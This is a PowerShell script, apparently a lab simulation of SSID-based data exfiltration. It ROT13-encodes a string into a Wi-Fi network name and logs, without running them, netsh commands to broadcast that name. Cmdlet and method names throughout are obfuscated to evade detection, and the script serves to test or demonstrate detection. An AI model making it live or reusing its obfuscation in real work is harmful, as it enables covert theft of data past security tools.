function Invoke-SSIDExfil {
    [CmdletBinding()]
    param(
        [switch]$ExfilOnly,
        [switch]$Decode,
        [string]$StringToExfiltrate,
        [string]$StringToDecode
    )
    function ConvertTo-ROT13 {
        param([string]$InputString)
        $builder = &('N'+'ew-'+'Objec'+'t') System.Text.StringBuilder
        foreach ($char in $InputString.("{1}{2}{0}" -f'ray','ToCh','arAr').Invoke()) {
            $code = [int][char]$char
            switch ($code) {
                { $_ -ge 65 -and $_ -le 90 } {
                    [void]$builder."aPPe`Nd"([char]((($_ - 65 + 13) % 26) + 65))
                    continue
                }
                { $_ -ge 97 -and $_ -le 122 } {
                    [void]$builder."A`PPenD"([char]((($_ - 97 + 13) % 26) + 97))
                    continue
                }
                default {
                    [void]$builder.("{1}{0}" -f'ppend','A').Invoke($char)
                }
            }
        }
        return $builder.("{0}{1}{2}" -f'T','oStrin','g').Invoke()
    }
    $artifactDir = .('Jo'+'in-P'+'ath') $PSScriptRoot "artifacts\ssid-exfil"
    if (-not (.('Tes'+'t-Pa'+'th') $artifactDir)) {
        $null = .('New-'+'Ite'+'m') -ItemType Directory -Path $artifactDir -Force
    }
    if ($Decode) {
        $decoded = .('Con'+'v'+'e'+'rtTo-ROT13') -InputString $StringToDecode
        &('Writ'+'e-Out'+'p'+'ut') "[safe] Decoded value: $decoded"
        return
    }
    if ($ExfilOnly) {
        $plainText = $StringToExfiltrate
    }
    else {
        $plainText = "LAB:alice:hello"
    }
    if ([string]::("{4}{0}{2}{3}{1}" -f'Nul','iteSpace','lO','rWh','Is').Invoke($plainText)) {
        throw "StringToExfiltrate cannot be empty."
    }
    if ($plainText."lEn`GTH" -gt 32) {
        throw "The simulated SSID payload must be 32 characters or fewer."
    }
    $ssidName = .('C'+'onvertTo-'+'R'+'OT13') -InputString $plainText
    $logPath = &('Join'+'-Pat'+'h') $artifactDir "ssid-actions.txt"
    $commands = @(
        "[safe] Would run: netsh wlan set hostednetwork mode=allow ssid=`"$ssidName`" key='HardtoGuess!@#123'",
        "[safe] Would run: netsh wlan start hostednetwork",
        "[safe] Plaintext source: $plainText",
        "[safe] ROT13 SSID: $ssidName"
    )
    &('Set-'+'C'+'on'+'tent') -Path $logPath -Value $commands -Encoding UTF8
    &('W'+'ri'+'te-Output') "[safe] Simulated SSID exfiltration value: $ssidName"
    .('Wr'+'ite-O'+'utpu'+'t') "[safe] Actions logged to $logPath"
}
.('Inv'+'oke-SS'+'ID'+'Ex'+'fil') -ExfilOnly -StringToExfiltrate "LAB:alice:hello"
